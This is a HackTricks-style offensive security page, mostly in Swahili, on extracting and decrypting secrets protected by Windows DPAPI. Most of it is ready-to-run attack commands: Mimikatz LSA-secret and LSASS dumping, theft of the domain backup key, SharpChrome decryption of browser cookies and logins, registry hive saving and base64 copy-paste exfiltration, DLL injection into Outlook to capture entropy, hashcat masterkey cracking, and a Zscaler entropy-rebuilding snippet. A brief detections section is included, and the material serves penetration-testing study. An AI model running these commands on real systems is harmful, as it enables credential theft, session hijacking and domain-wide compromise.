# DPAPI - Kutoa Nenosiri

{{#include ../../banners/hacktricks-training.md}}



## DPAPI ni nini

The Data Protection API (DPAPI) hutumika hasa ndani ya mfumo wa uendeshaji wa Windows kwa ajili ya **symmetric encryption of asymmetric private keys**, ikitumia siri za mtumiaji au za mfumo kama chanzo kikubwa cha entropia. Njia hii inarahisisha encryption kwa waendelezaji kwa kuwa inawawezesha kuficha data kwa kutumia funguo inayotokana na siri za kuingia za mtumiaji au, kwa encryption ya mfumo, siri za uthibitishaji wa domain ya mfumo, hivyo kuwafanya waendelezaji wasiogope kusimamia ulinzi wa funguo za encryption wenyewe.

Njia inayotumika zaidi kutumia DPAPI ni kupitia **`CryptProtectData` and `CryptUnprotectData`** functions, ambazo zinawezesha programu kuficha na kufungua data kwa usalama kwa session ya process ambayo imeingia sasa. Hii inamaanisha kuwa data iliyofichwa inaweza kufunguliwa tu na mtumiaji au mfumo ule ule uliyoificha.

Zaidi ya hayo, kazi hizi zinakubali pia parameter ya **`entropy`** ambayo itatumika wakati wa encryption na decryption; kwa hivyo, ili kufungua kitu kilichofichwa kwa kutumia parameter hii, lazima utoe thamani ile ile ya entropy iliyotumika wakati wa encryption.

### Uundaji wa funguo za watumiaji

DPAPI inazalisha funguo ya kipekee (inayoitwa **`pre-key`**) kwa kila mtumiaji kulingana na cheti chake. Kifunguo hiki kinatokana na nenosiri la mtumiaji na mambo mengine; algorithm inategemea aina ya mtumiaji lakini kawaida inatumia SHA1. Kwa mfano, kwa watumiaji wa domain, **inategemea NTLM hash ya mtumiaji**.

Hii ni ya kuvutia hasa kwa sababu kama mshambuliaji anaweza kupata hash ya nenosiri la mtumiaji, anaweza:

- **Kufungua data yoyote iliyofichwa kwa kutumia DPAPI** kwa funguo ya mtumiaji huyo bila hitaji la kuwasiliana na API yoyote
- Kujaribu **kuvunja nenosiri** offline kwa kujaribu kutengeneza funguo sahihi ya DPAPI

Zaidi ya hayo, kila mara data inafichwa na mtumiaji kwa kutumia DPAPI, funguo mpya ya **master key** inazalishwa. Funguo hii ya master ndiyo inayotumika kwa kweli kuficha data. Kila master key inaambatanishwa na **GUID** (Kitambulisho Kipekee Duniani) inayoiweka kipekee.

Master keys zinahifadhiwa katika saraka **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, ambapo `{SID}` ni Kitambulisho cha Usalama (Security Identifier) cha mtumiaji huyo. Master key inahifadhiwa ikiwa imefichwa kwa kutumia **`pre-key`** ya mtumiaji na pia kwa kutumia **domain backup key** kwa ajili ya urejeshaji (kwa hivyo funguo ile ile inahifadhiwa imefichwa mara 2 kwa njia mbili tofauti).

Kumbuka kuwa **domain key inayotumika kuficha master key iko kwenye domain controllers na haisogei kamwe**, hivyo ikiwa mshambuliaji ana ufikiaji wa domain controller, anaweza kupata domain backup key na kufungua master keys za watumiaji wote wa domain.

Mabaki yaliyofichwa yanaonyesha **GUID ya master key** ambayo ilitumiwa kuficha data ndani ya vichwa vyao.

> [!TIP]
> DPAPI encrypted blobs huanza na **`01 00 00 00`**

Tafuta master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
![](<../../images/image (1121).png>)

### Uundaji wa ufunguo wa Mashine/Mfumo

Huu ni ufunguo unaotumika na mashine kuficha data. Unatokana na **DPAPI_SYSTEM LSA secret**, ambayo ni ufunguo maalum ambao mtumiaji wa SYSTEM pekee anaweza kufikia. Ufunguo huu unatumiwa kuficha data inayohitajika kufikiwa na mfumo mwenyewe, kama vile sifa za ngazi ya mashine au siri za mfumo mzima.

Kumbuka kwamba funguo hizi **hazina backup ya domain**, hivyo zinapatikana tu kwa ndani ya mashine:

- **Mimikatz** inaweza kuzifikia kwa kutoa LSA secrets kwa kutumia amri: `mimikatz lsadump::secrets`
- Siri hiyo imehifadhiwa ndani ya registry, hivyo msimamizi anaweza **kubadilisha ruhusa za DACL ili kuzipata**. Njia ya registry ni: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Utoaji wa nje ya mtandao kutoka registry hives pia unaweza kufanyika. Kwa mfano, kama msimamizi kwenye lengo, hifadhi hives na exfiltrate them:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Kisha kwenye analysis box yako, rejesha DPAPI_SYSTEM LSA secret kutoka kwenye hives na uitumie ku-decrypt machine-scope blobs (scheduled task passwords, service credentials, Wi‑Fi profiles, etc.):
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### Protected Data by DPAPI

Miongoni mwa data za kibinafsi zilizolindwa na DPAPI ni:

- kredensiali za Windows
- nywila na data za kujaza kiotomatiki za Internet Explorer na Google Chrome
- nywila za akaunti za barua pepe na FTP za ndani kwa programu kama Outlook na Windows Mail
- nywila za folda zilizosambazwa, rasilimali, mitandao isiotumia waya, na Windows Vault, pamoja na funguo za usimbaji
- nywila za muunganisho wa remote desktop, .NET Passport, na funguo binafsi kwa madhumuni mbalimbali ya usimbaji na uthibitisho
- nywila za mtandao zinazosimamiwa na Credential Manager na data za kibinafsi katika programu zinazotumia CryptProtectData, kama Skype, MSN messenger, na nyinginezo
- blobs zilizofichwa ndani ya register
- ...

Data za mfumo zilizo lindwa ni pamoja na:
- nywila za Wifi
- nywila za kazi zilizopangwa
- ...

### Chaguzi za kuchukua master key

- Ikiwa mtumiaji ana ruhusa za domain admin, wanaweza kufikia **domain backup key** ili kufungua (ku-decrypt) master keys zote za watumiaji katika domain:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- With local admin privileges, inawezekana **kupata kumbukumbu ya LSASS** ili kutoa DPAPI master keys za watumiaji wote waliounganishwa na funguo ya SYSTEM.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Ikiwa mtumiaji ana local admin privileges, wanaweza kupata **DPAPI_SYSTEM LSA secret** ili kudekripta vifunguo kuu vya mashine:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Ikiwa password au hash NTLM ya user inajulikana, unaweza **decrypt the master keys of the user directly**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Ikiwa uko ndani ya session kama mtumiaji, inawezekana kumuomba DC kwa **backup key to decrypt the master keys using RPC**. Ikiwa wewe ni local admin na mtumiaji ameingia, unaweza **steal his session token** kwa hili:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Orodhesha Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Fikia Data Iliyosimbwa ya DPAPI

### Tafuta data iliyosimbwa ya DPAPI

Faili za watumiaji **zililindwa** kwa kawaida ziko katika:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Pia angalia kubadilisha `\Roaming\` kuwa `\Local\` katika njia zilizo hapo juu.

Mifano ya uorodheshaji:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) inaweza kupata DPAPI encrypted blobs katika file system, registry na B64 blobs:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Kumbuka kwamba [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (kutoka kwenye repo ile ile) inaweza kutumika kufungua kwa DPAPI data nyeti kama cookies.

#### Chromium/Edge/Electron mapishi ya haraka (SharpChrome)

- Mtumiaji wa sasa, interactive decryption ya saved logins/cookies (inafanya kazi hata na Chrome 127+ app-bound cookies kwa sababu ufunguo wa ziada hutatuliwa kutoka kwa user’s Credential Manager wakati inapoendesha katika user context):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Uchambuzi wa offline wakati una faili tu. Kwanza toa ufunguo wa AES state kutoka kwenye profaili "Local State" kisha utumie ku-decrypt cookie DB:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- Uchambuzi wa domain-wide/remote wakati una DPAPI domain backup key (PVK) na admin kwenye target host:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- Ikiwa una DPAPI prekey/credkey ya mtumiaji (kutoka LSASS), unaweza kuruka password cracking na moja kwa moja decrypt data za wasifu:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Notes
- Matoleo mapya ya Chrome/Edge yanaweza kuhifadhi cookies fulani kwa kutumia usimbaji "App-Bound". Ku-decrypt nje ya mtandao kwa cookies hizo maalum haiwezekani bila app-bound key ya ziada; endesha SharpChrome katika target user context ili kuipata kiotomatiki. Tazama chapisho la blogi ya usalama la Chrome lililotajwa hapa chini.

### Funguo za ufikiaji na data

- **Tumia SharpDPAPI** ili kupata credentials kutoka kwa faili zilizosimbwa na DPAPI kutoka kwenye current session:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Pata taarifa za credentials** kama encrypted data na guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Pata masterkeys**:

Dekripta masterkey ya mtumiaji aliyeomba **domain backup key** kwa kutumia RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Zana ya **SharpDPAPI** pia inaunga mkono vigezo hivi kwa ajili ya kufungua masterkey (kumbuka jinsi inavyowezekana kutumia `/rpc` kupata funguo ya backup ya domain, `/password` kutumia nenosiri wazi, au `/pvk` kutaja faili ya funguo binafsi ya DPAPI...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Decrypt data kwa kutumia masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Zana ya **SharpDPAPI** pia inasaidia hoja hizi kwa ajili ya `credentials|vaults|rdg|keepass|triage|blob|ps` decryption (angalia jinsi inavyowezekana kutumia `/rpc` kupata domains backup key, `/password` kutumia plaintext password, `/pvk` kubainisha DPAPI domain private key file, `/unprotect` kutumia current users session...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Kutumia DPAPI prekey/credkey moja kwa moja (hakuna password inahitajika)

Ikiwa unaweza dump LSASS, Mimikatz mara nyingi hutoa per-logon DPAPI key inayoweza kutumika ku-decrypt masterkeys za mtumiaji bila kujua plaintext password. Tumia thamani hii moja kwa moja kwenye tooling:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- Dekripti baadhi ya data ukitumia **kikao cha mtumiaji wa sasa**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Dekripsi ya nje (offline) kwa kutumia Impacket dpapi.py

Iwapo una SID ya mtumiaji wa mwathiriwa na nenosiri (au NT hash), unaweza ku-decrypt DPAPI masterkeys na Credential Manager blobs kabisa bila mtandao kwa kutumia Impacket dpapi.py.

- Tambua faili muhimu kwenye diski:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- Masterkey inayolingana: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Ikiwa zana za kuhamisha faili hazifanyi kazi vizuri, fanya base64 kwa faili kwenye mwenyeji (on-host) kisha nakili matokeo:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- Ondoa usimbaji wa masterkey kwa kutumia SID ya mtumiaji na password/hash:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- Tumia decrypted masterkey ili ku-decrypt credential blob:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
Mchakato huu mara nyingi hurudisha domain credentials zilizohifadhiwa na apps zinazotumia Windows Credential Manager, ikiwa ni pamoja na akaunti za kiutawala (mf., `*_adm`).

---

### Kushughulikia Entropy ya Hiari ("Third-party entropy")

Baadhi ya applications hupitisha thamani ya ziada ya **entropy** kwa `CryptProtectData`. Bila thamani hii blob haiwezi kufunguliwa (decrypted), hata kama masterkey sahihi inajulikana. Kupata entropy ni muhimu kwa hivyo unapolenga credentials zilizolindwa kwa njia hii (mf., Microsoft Outlook, baadhi ya VPN clients).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) ni user-mode DLL inayohook DPAPI functions ndani ya target process na inarekodi kwa uwazi entropy yoyote ya hiari inayotolewa. Kukimbiza EntropyCapture katika mode ya **DLL-injection** dhidi ya processes kama `outlook.exe` au `vpnclient.exe` itatoa faili inayoonyesha mechi ya kila entropy buffer na process inayoiita pamoja na blob. Entropy iliyorekodiwa inaweza kisha kutolewa kwa **SharpDPAPI** (`/entropy:`) au **Mimikatz** (`/entropy:<file>`) ili kufungua data.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Microsoft ilitambulisha muundo wa **context 3** masterkey kuanzia Windows 10 v1607 (2016). `hashcat` v6.2.6 (Desemba 2023) iliongeza hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) na **22102** (context 3), ikiruhusu GPU-accelerated cracking ya user passwords moja kwa moja kutoka kwa masterkey file. Wavamizi kwa hivyo wanaweza kufanya word-list au brute-force attacks bila kuingiliana na mfumo lengwa.

`DPAPISnoop` (2024) hufanya mchakato huo kiotomatiki:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Zana pia inaweza kuchambua blobs za Credential na Vault, ku-decrypt kwa kutumia cracked keys na ku-export cleartext passwords.

### Kufikia data za mashine nyingine

Katika **SharpDPAPI and SharpChrome** unaweza kutumia chaguo la **`/server:HOST`** ili kufikia data za mashine ya mbali. Bila shaka unahitaji uwezo wa kufikia mashine hiyo, na katika mfano ufuatao inadhaniwa kuwa **domain backup encryption key is known**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Other tools

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) ni zana inayoendesha kwa otomatiki uondoaji wa watumiaji wote na kompyuta kutoka kwenye directory ya LDAP pamoja na uondoaji wa domain controller backup key kupitia RPC. Script itaamua anwani za IP za kompyuta zote kisha itafanya smbclient kwenye kompyuta zote ili kupata DPAPI blobs za watumiaji wote na kuzoea kusigma kila kitu kwa domain backup key.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Kwa orodha ya kompyuta zilizotolewa kutoka LDAP unaweza kupata kila subnet hata kama hukujua!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) inaweza kutoa siri zilizolindwa na DPAPI kiotomatiki. Toleo la 2.x liliweka:

* Ukusanyaji sambamba wa blobs kutoka kwa mamia ya hosts
* Uchanganaji wa masterkeys za **context 3** na utekelezaji wa kuunganisha moja kwa moja na Hashcat kwa cracking
* Msaada kwa cookies zilizo enkryptwa za Chrome "App-Bound" (angalia sehemu inayofuata)
* Mode mpya ya **`--snapshot`** ya kuchunguza mara kwa mara endpoints na kutofautisha blobs zilizoundwa mpya

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) ni parser ya C# kwa masterkey/credential/vault files ambayo inaweza kutoa format za Hashcat/JtR na kwa hiari kuita cracking kiotomatiki. Inaunga mkono kikamilifu miundo ya masterkey ya machine na user hadi Windows 11 24H1.

## Common detections

- Ufikiaji wa faili katika `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` na saraka nyingine zinazohusiana na DPAPI.
- Haswa kutoka network share kama **C$** au **ADMIN$**.
- Matumizi ya **Mimikatz**, **SharpDPAPI** au zana zinazofanana za kupata kumbukumbu ya LSASS au kuchoma masterkeys.
- Event **4662**: *An operation was performed on an object* – inaweza kuhusishwa na ufikiaji wa kitu **`BCKUPKEY`**.
- Event **4673/4674** wakati mchakato unaomba *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### 2023-2025 vulnerabilities & ecosystem changes

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (November 2023). Mshambuliaji mwenye ufikiaji wa mtandao angeweza kudanganya domain member ili ipakue DPAPI backup key ya hasidi, kuruhusu kusomewa kwa masterkeys za watumiaji. Imetengenezwa kwenye cumulative update ya November 2023 – wasimamizi wanapaswa kuhakikisha DCs na workstations zimepatchiwa kikamilifu.
* **Chrome 127 “App-Bound” cookie encryption** (July 2024) ilibadilisha ulinzi wa zamani uliotegemea DPAPI pekee kwa kuongeza ufunguo wa ziada uliohifadhiwa ndani ya **Credential Manager** ya mtumiaji. Kufungua cookies offline sasa kunahitaji DPAPI masterkey pamoja na **GCM-wrapped app-bound key**. SharpChrome v2.3 na DonPAPI 2.x zina uwezo wa kupata ufunguo wa ziada ikiwa zinaendeshwa katika muktadha wa mtumiaji.

### Case Study: Zscaler Client Connector – Custom Entropy Derived From SID

Zscaler Client Connector inaweka mafaili kadhaa ya usanidi chini ya `C:\ProgramData\Zscaler` (mfano `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Kila faili imefungwa kwa **DPAPI (Machine scope)** lakini muuzaji hutoa **custom entropy** ambayo *inahesabiwa wakati wa utekelezaji* badala ya kuhifadhiwa kwenye diski.

Entropy inajengwa upya kutoka vipengele viwili:

1. Siri iliyowekwa kwa hard-coded ndani ya `ZSACredentialProvider.dll`.
2. The **SID** ya akaunti ya Windows ambayo usanidi unamuwekwa.

The algorithm implemented by the DLL is equivalent to:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Kwa kuwa siri imeingizwa ndani ya DLL ambayo inaweza kusomwa kutoka kwenye diski, **mshambuliaji yeyote wa ndani mwenye haki za SYSTEM anaweza kuunda upya entropy kwa SID yoyote** na decrypt blobs offline:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Ufichaji hutoa usanidi kamili wa JSON, ikiwa ni pamoja na kila **device posture check** na thamani yake inayotarajiwa — taarifa ambayo ni ya thamani kubwa wakati wa kujaribu client-side bypasses.

> TIP: the other encrypted artefacts (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) are protected with DPAPI **without** entropy (`16` zero bytes). They can therefore be decrypted directly with `ProtectedData.Unprotect` once SYSTEM privileges are obtained.

## Marejeo

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)
- [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [GhostPack SharpDPAPI/SharpChrome – Usage and options](https://github.com/GhostPack/SharpDPAPI)

{{#include ../../banners/hacktricks-training.md}}
